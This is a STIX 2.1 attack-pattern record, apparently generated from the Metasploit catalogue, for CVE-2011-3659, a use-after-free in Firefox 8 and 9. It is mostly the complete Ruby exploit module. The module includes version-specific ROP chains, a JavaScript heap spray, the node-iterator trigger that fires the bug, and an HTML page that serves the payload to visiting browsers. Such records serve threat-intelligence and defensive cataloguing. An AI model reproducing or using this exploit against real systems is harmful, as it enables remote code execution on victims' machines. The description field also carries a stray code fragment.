{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--33b2a307-a84d-4307-aa3f-38ed1e9ec1a4",
    "created": "2024-08-14T16:44:54.472984Z",
    "modified": "2024-08-14T16:44:54.472989Z",
    "name": "Firefox 8/9 AttributeChildRemoved() Use-After-Free",
    "description": " This module exploits a use-after-free vulnerability in Firefox 8/8.0.1 and 9/9.0.1. Removal of child nodes from the nsDOMAttribute can allow for a child to still be accessible after removal due to a premature notification of AttributeChildRemoved. Since mFirstChild is not set to NULL until after this call is made, this means the removed child will be accessible after it has been removed. By carefully manipulating the memory layout this can lead to arbitrary code execution.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/browser/mozilla_attribchildremoved.rb",
            "external_id": "mozilla_attribchildremoved.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2011-3659"
        },
        {
            "source_name": "reference",
            "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=708198"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = AverageRanking\n\n  include Msf::Exploit::Remote::HttpServer::HTML\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Firefox 8/9 AttributeChildRemoved() Use-After-Free',\n      'Description'    => %q{\n        This module exploits a use-after-free vulnerability in Firefox 8/8.0.1 and 9/9.0.1.\n        Removal of child nodes from the nsDOMAttribute can allow for a child\n        to still be accessible after removal due to a premature notification\n        of AttributeChildRemoved. Since mFirstChild is not set to NULL until\n        after this call is made, this means the removed child will be accessible\n        after it has been removed. By carefully manipulating the memory layout,\n        this can lead to arbitrary code execution.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          'regenrecht',                          #vulnerability discovery\n          'Lincoln <lincoln[at]corelan.be>',      #Metasploit module\n          'corelanc0d3r <peter.ve[at]corelan.be>' #Metasploit module\n        ],\n      'References'     =>\n        [\n          [ 'CVE', '2011-3659' ],\n          [ 'OSVDB', '78736' ],\n          [ 'ZDI', '12-110'],\n          [ 'URL', 'https://bugzilla.mozilla.org/show_bug.cgi?id=708198' ]\n        ],\n      'DefaultOptions' =>\n        {\n          'EXITFUNC' => 'process',\n          'InitialAutoRunScript' => 'post/windows/manage/priv_migrate'\n        },\n      'Payload'        =>\n        {\n          'BadChars'       => \"\\x00\\x0a\\x0d\\x34\",\n          'DisableNops'    => true,\n          'PrependEncoder' => \"\\x81\\xc4\\x24\\xfa\\xff\\xff\"  #ADD ESP, -5DC\n        },\n      'Platform'       => 'win',\n      'Targets'        =>\n        [\n          [ 'Automatic', {} ],\n          [\n            'Windows XP - Firefox 8 / 8.0.1',\n            {\n              'Ret'\t\t=> 0x0C0C0C0C,\n              'OffSet'\t=> 0x606,\n              'Size'\t\t=> 0x40000,\n              'StackFlip'\t=> 0x7818f50b, # XCHG EAX,ESP # POP EBP # POP EBX # RETN [MOZCRT19.dll]\n              'PopEsp'\t=> [ 0x0c0c0c0c, 0x0c0c0c0c, 0x7819548e, 0x0c0c0c10 ],\n              'FF'\t\t=> 8,\n              'OS'\t\t=> 'XP'\n            }\n          ],\n          [\n            'Windows XP - Firefox 9',\n            {\n              'Ret'\t\t=> 0x0C0C0C0C,\n              'OffSet'\t=> 0x606,\n              'Size'\t\t=> 0x40000,\n              'StackFlip'\t=> 0x1000ed58, # XCHG EAX,ESP # ... # POP ESI # RETN [nspr4.dll]\n              'PopEsp'\t=> [ 0x0c0c0c0c, 0x10006a01, 0x0c0c0c10 ], # POP ESP # RETN [nspr4.dll]\n              'FF'\t\t=> 9,\n              'OS'\t\t=> 'XP'\n            }\n          ],\n          [\n            'Windows XP - Firefox 9.0.1',\n            {\n              'Ret'\t\t=> 0x0C0C0C0C,\n              'OffSet'\t=> 0x606,\n              'Size'\t\t=> 0x40000,\n              'StackFlip'\t=> 0x1000ed4a, # XCHG EAX,ESP # ... # POP ESI # RETN [nspr4.dll]\n              'PopEsp'\t=> [ 0x0c0c0c0c, 0x10006a11, 0x0c0c0c10 ], # POP ESP # RETN [nspr4.dll]\n              'FF'\t\t=> 901,\n              'OS'\t\t=> 'XP'\n            }\n          ]\n        ],\n      'DisclosureDate' => '2011-12-06',\n      'DefaultTarget'  => 0))\n\n  end\n\n  def autofilter\n    false\n  end\n\n  def check_dependencies\n    use_zlib\n  end\n\n  def junk(n=4)\n    return rand_text_alpha_upper(n).unpack(\"L\")[0].to_i\n  end\n\n  def nop\n    return make_nops(4).unpack(\"L\")[0].to_i\n  end\n\n  def get_rop_chain(ffversion,osversion)\n\n    # mona.py ROP chains\n\n    rop_chain = []\n\n    if ffversion == 8 and osversion == \"XP\"\n\n      rop_chain =\n      [\n        0x7819c80a,     # POP EAX # RETN [MOZCRT19.dll]\n        0x781a909c,     # ptr to &VirtualAlloc() [IAT MOZCRT19.dll]\n        0x7813af5d,     # MOV EAX,DWORD PTR DS:[EAX] # RETN [MOZCRT19.dll]\n        0x78197f06,     # XCHG EAX,ESI # RETN [MOZCRT19.dll]\n        0x7814eef1,     # POP EBP # RETN [MOZCRT19.dll]\n        0x781503c3,     # & call esp [MOZCRT19.dll]\n        0x781391d0,     # POP EBX # RETN [MOZCRT19.dll]\n        0x00000001,     # 0x00000001-> ebx\n        0x781a147c,     # POP EDX # RETN [MOZCRT19.dll]\n        0x00001000,     # 0x00001000-> edx\n        0x7819728e,     # POP ECX # RETN [MOZCRT19.dll]\n        0x00000040,     # 0x00000040-> ecx\n        0x781945b5,     # POP EDI # RETN [MOZCRT19.dll]\n        0x78152809,     # RETN (ROP NOP) [MOZCRT19.dll]\n        0x7819ce58,     # POP EAX # RETN [MOZCRT19.dll]\n        nop,            # nop\n        0x7813d6b7,     # PUSHAD # RETN [MOZCRT19.dll]\n      ].flatten.pack(\"V*\")\n\n    elsif ffversion == 9 and osversion == \"XP\"\n\n      rop_chain =\n      [\n        0x10019ee9,\t# POP ECX # RETN [nspr4.dll]\n        0x10020060,\t# ptr to &LoadLibraryW() [IAT nspr4.dll]\n        0x1000f994,\t# MOV EAX,DWORD PTR DS:[ECX] # RETN [nspr4.dll]\n        0x10012ad0,\t# POP EBX # RETN [nspr4.dll]\n        0x00000000,\t# clear ebx\n        0x10006f41,\t# ADD EBX,EAX # XOR EAX,EAX # RETN\n        0x1000cf40,\t# POP EDX # RETN 00 [nspr4.dll]\n        0x1000d6ce,\t# RETN (ROP NOP) [nspr4.dll]\n        0x10019ee9,\t# POP ECX # RETN [nspr4.dll]\n        0x0c0c0c50,\t# xul.dll (Unicode string)\n        0x1000eeb4,\t# POP EDI # RETN [nspr4.dll]\n        0x1001f145,\t# ADD ESP,0C # RETN [nspr4.dll] - call LoadLibrary\n        0x10004860,\t# POP EAX # RETN [nspr4.dll]\n        0x1001f111,\t# ADD ESP,10 # POP ESI # RETN [nspr4.dll]\n        0x100058B3,\t# PUSHAD # CALL EAX [nspr4.dll]\n        junk,\t\t# win some, lose some\n        0x00750078,\t# xu\n        0x002e006c,\t# l.\n        0x006c0064,\t# dl\n        0x0000006c,\t# l\n        0x1000cf40,\t# POP EDX # RETN 00 [nspr4.dll]\n        0x00A63374,\t# Delta to IAT VirtualAlloc()\n        0x10018ada,\t# ADD EAX,EDX # RETN [nspr4.dll]\n        0x10008ddf,\t# MOV EAX,DWORD PTR DS:[EAX] # RETN    ** [nspr4.dll]\n        0x1000a031,     # POP ESI # RETN    ** [nspr4.dll]\n        0x1000a031,     # POP ESI # RETN    ** [nspr4.dll] (readable address)\n        0x10013f1f,\t# XCHG EAX,ESI # ADD DL,BYTE PTR DS:[EAX] # RETN [nspr4.dll]\n        0x1000687b,\t# POP EBP # RETN [nspr4.dll]\n        0x1001a59b,\t# & call esp [nspr4.dll]\n        0x10012ad0,\t# POP EBX # RETN [nspr4.dll]\n        0x00000001,\t# 0x00000001-> ebx\n        0x1000cf40,\t# POP EDX # RETN 00 [nspr4.dll]\n        0x00001000,\t# 0x00001000-> edx\n        0x1001069e,\t# POP ECX # RETN [nspr4.dll]\n        0x00000040,\t# 0x00000040-> ecx\n        0x1000eeb4,\t# POP EDI # RETN [nspr4.dll]\n        0x1000d6ce,\t# RETN (ROP NOP) [nspr4.dll]\n        0x10004860,\t# POP EAX # RETN [nspr4.dll]\n        0x10004860,\t# POP EAX # RETN [nspr4.dll]\n        0x100058B3,\t# PUSHAD # CALL EAX [nspr4.dll]\n      ].flatten.pack(\"V*\")\n\n\n    elsif ffversion == 901 and osversion == \"XP\"\n\n      rop_chain =\n      [\n        0x1000bfc1,\t# POP ECX # RETN [nspr4.dll]\n        0x10020060,\t# ptr to &LoadLibraryW() [IAT nspr4.dll]\n        0x1000f986,\t# MOV EAX,DWORD PTR DS:[ECX] # RETN [nspr4.dll]\n        0x1000f5ef,\t# POP EBX # RETN [nspr4.dll]\n        0x00000000,\t# clear ebx\n        0x10006f51,\t# ADD EBX,EAX # XOR EAX,EAX # RETN\n        0x1000cf2c,\t# POP EDX # RETN 00 [nspr4.dll]\n        0x1001ea03,\t# RETN (ROP NOP) [nspr4.dll]\n        0x1000bfc1,\t# POP ECX # RETN [nspr4.dll]\n        0x0c0c0c50,\t# xul.dll (Unicode string)\n        0x1000eea6,\t# POP EDI # RETN [nspr4.dll]\n        0x1000dda4,\t# ADD ESP,0C # RETN [nspr4.dll] - call LoadLibrary\n        0x10004870,\t# POP EAX # RETN [nspr4.dll]\n        0x10001ab4,\t# ADD ESP,10 # POP ESI # RETN [nspr4.dll]\n        0x100058c3,\t# PUSHAD # CALL EAX [nspr4.dll]\n        junk,\t\t# win some, lose some\n        0x00750078,\t# xu\n        0x002e006c,\t# l.\n        0x006c0064,\t# dl\n        0x0000006c,\t# l\n        0x1000cf2c,\t# POP EDX # RETN 00 [nspr4.dll]\n        0x00A63374,\t# Delta to IAT VirtualAlloc()\n        0x10018acf,\t# ADD EAX,EDX # RETN [nspr4.dll]\n        0x10008dd1,\t# MOV EAX,DWORD PTR DS:[EAX] # RETN    ** [nspr4.dll]\n        0x1000e0b8,\t# POP ESI # RETN    ** [nspr4.dll]\n        0x1000e0b8,\t# POP ESI # RETN    ** [nspr4.dll] (readable address)\n        0x10013f14,\t# XCHG EAX,ESI # ADD DL,BYTE PTR DS:[EAX] # RETN [nspr4.dll]\n        0x100162d5,\t# POP EBP # RETN [nspr4.dll]\n        0x10019d12,\t# & push esp #  ret  [nspr4.dll]\n        0x1000f5ef,\t# POP EBX # RETN [nspr4.dll]\n        0x00000001,\t# 0x00000001-> ebx\n        0x1000cf2c,\t# POP EDX # RETN 00 [nspr4.dll]\n        0x00001000,\t# 0x00001000-> edx\n        0x10007e46,\t# POP ECX # RETN [nspr4.dll]\n        0x00000040,\t# 0x00000040-> ecx\n        0x1000eea6,\t# POP EDI # RETN [nspr4.dll]\n        0x1001ea03,\t# RETN (ROP NOP) [nspr4.dll]\n        0x10004870,\t# POP EAX # RETN [nspr4.dll]\n        0x10004870,\t# POP EAX # RETN [nspr4.dll]\n        0x100058c3,\t# PUSHAD # CALL EAX [nspr4.dll]\n      ].flatten.pack(\"V*\")\n\n\n    end\n\n    return rop_chain\n  end\n\n\n  def on_request_uri(cli, request)\n    # Re-generate the payload.\n    return if ((p = regenerate_payload(cli)) == nil)\n\n    # determine the target FF and OS version\n\n    ffversion = \"\"\n    osversion = \"\"\n\n    agent = request.headers['User-Agent']\n\n    my_target = target\n    if my_target.name == 'Automatic'\n      if agent =~ /NT 5\\.1/ and agent =~ /Firefox\\/8/\n        my_target = targets[1]\n      elsif agent =~ /NT 5\\.1/ and agent =~ /Firefox\\/9\\.0\\.1/\n        my_target = targets[3]\n      elsif agent =~ /NT 5\\.1/ and agent =~ /Firefox\\/9\\.0/\n        my_target = targets[2]\n      else\n        print_error(\"Target not supported: #{agent.to_s}\")\n        send_not_found(cli)\n        return\n      end\n      target = my_target\n    end\n\n    # Create the payload\n    print_status(\"Creating payload for #{target.name}\")\n\n    rop = [ target['StackFlip'] ].pack(\"V\")\n    rop << get_rop_chain(target['FF'],target['OS'])\n    rop_js = Rex::Text.to_unescape(rop, Rex::Arch.endian(target.arch))\n\n    code = payload.encoded\n    code_js = Rex::Text.to_unescape(code, Rex::Arch.endian(target.arch))\n\n    popesp = target['PopEsp'].flatten.pack(\"V*\")\n    popesp_js = Rex::Text.to_unescape(popesp, Rex::Arch.endian(target.arch))\n\n    filler = [ junk ].pack(\"V*\")\n    filler_js = Rex::Text.to_unescape(filler, Rex::Arch.endian(target.arch))\n\n    # random JavaScript variable names\n    i_name                  = rand_text_alpha(rand(10) + 5)\n    rop_name                = rand_text_alpha(rand(10) + 5)\n    code_name               = rand_text_alpha(rand(10) + 5)\n    offset_length_name      = rand_text_alpha(rand(10) + 5)\n    randnum1_name           = rand_text_alpha(rand(10) + 5)\n    randnum2_name           = rand_text_alpha(rand(10) + 5)\n    randnum3_name           = rand_text_alpha(rand(10) + 5)\n    randnum4_name           = rand_text_alpha(rand(10) + 5)\n    paddingstr_name         = rand_text_alpha(rand(10) + 5)\n    padding_name            = rand_text_alpha(rand(10) + 5)\n    junk_offset_name        = rand_text_alpha(rand(10) + 5)\n    single_sprayblock_name  = rand_text_alpha(rand(10) + 5)\n    sprayblock_name         = rand_text_alpha(rand(10) + 5)\n    varname_name            = rand_text_alpha(rand(10) + 5)\n    thisvarname_name        = rand_text_alpha(rand(10) + 5)\n    attr_name               = rand_text_alpha(rand(10) + 5)\n    foo_name                = rand_text_alpha(rand(10) + 5)\n    bar_name                = rand_text_alpha(rand(10) + 5)\n    ni_name                 = rand_text_alpha(rand(10) + 5)\n    small_name              = rand_text_alpha(rand(10) + 5)\n    addr_name               = rand_text_alpha(rand(10) + 5)\n    run_name                = rand_text_alpha(rand(10) + 5)\n    container_name          = rand_text_alpha(rand(10) + 5)\n\n    # corelan precise heap spray:\n    # https://www.corelan.be/index.php/2011/12/31/exploit-writing-tutorial-part-11-heap-spraying-demystified/\n    # + trigger routine\n    spray = <<-JS\n\n    var #{rop_name} = unescape(\"#{rop_js}\");\n    var #{code_name} = unescape(\"#{code_js}\");\n    var #{offset_length_name} = #{target['OffSet']};\n\n    for (var #{i_name}=0; #{i_name} < 0x320; #{i_name}++)\n    {\n      var #{randnum1_name}=Math.floor(Math.random()*90)+10;\n      var #{randnum2_name}=Math.floor(Math.random()*90)+10;\n      var #{randnum3_name}=Math.floor(Math.random()*90)+10;\n      var #{randnum4_name}=Math.floor(Math.random()*90)+10;\n\n      var #{paddingstr_name} = \"%u\" + #{randnum1_name}.toString() + #{randnum2_name}.toString();\n      #{paddingstr_name} += \"%u\" + #{randnum3_name}.toString() + #{randnum4_name}.toString();\n\n      var #{padding_name} = unescape(#{paddingstr_name});\n\n      while (#{padding_name}.length < 0x1000) #{padding_name}+= #{padding_name};\n\n      #{junk_offset_name} = #{padding_name}.substring(0, #{offset_length_name});\n\n      var #{single_sprayblock_name} = #{junk_offset_name} + #{rop_name} + #{code_name};\n      #{single_sprayblock_name} += #{padding_name}.substring(0,0x800 - #{offset_length_name} - #{rop_name}.length - #{code_name}.length);\n\n      while (#{single_sprayblock_name}.length < #{target['Size']}) #{single_sprayblock_name} += #{single_sprayblock_name};\n\n      #{sprayblock_name} = #{single_sprayblock_name}.substring(0, (#{target['Size']}-6)/2);\n\n      #{varname_name} = \"var\" + #{randnum1_name}.toString() + #{randnum2_name}.toString();\n      #{varname_name} += #{randnum3_name}.toString() + #{randnum4_name}.toString() + #{i_name}.toString();\n      #{thisvarname_name} = \"var \" + #{varname_name} + \"= '\" + #{sprayblock_name} +\"';\";\n      eval(#{thisvarname_name});\n    }\n\n    function #{run_name}() {\n      var #{attr_name} = document.createAttribute(\"#{foo_name}\");\n      #{attr_name}.value = \"#{bar_name}\";\n\n      var #{ni_name} = document.createNodeIterator(\n        #{attr_name}, NodeFilter.SHOW_ALL,\n        {acceptNode: function(node) { return NodeFilter.FILTER_ACCEPT; }},\n        false);\n\n      #{ni_name}.nextNode();\n      #{ni_name}.nextNode();\n      #{ni_name}.previousNode();\n\n      #{attr_name}.value = null;\n\n      const #{addr_name} = unescape(\"#{filler_js}\");\n      var #{container_name} = new Array();\n      var #{small_name} = unescape(\"#{popesp_js}\")\n      while (#{small_name}.length != 30)\n        #{small_name} += #{addr_name};\n      for (#{i_name} = 0; #{i_name} < 1024*1024*2; ++#{i_name})\n        #{container_name}.push(unescape(#{small_name}));\n\n      #{ni_name}.referenceNode;\n\n    }\n    JS\n\n    # build html\n    content = <<-HTML\n    <html>\n    <head>\n    <meta http-equiv=\"refresh\" content=\"3\">\n    <body>\n    <script language='javascript'>\n    #{spray}\n    </script>\n    </head>\n    <body onload=\"#{run_name}();\">\n    </svg>\n    </body>\n    </html>\n    HTML\n\n    print_status(\"Returning HTML\")\n\n    # Transmit the response to the client\n    send_response(cli, content, {'Content-Type'=>'text/html'})\n\n  end\nend\n\n",
    "x_mitre_disclosure_date": "2011-12-06",
    "x_mitre_platforms": [
        "win'"
    ]
}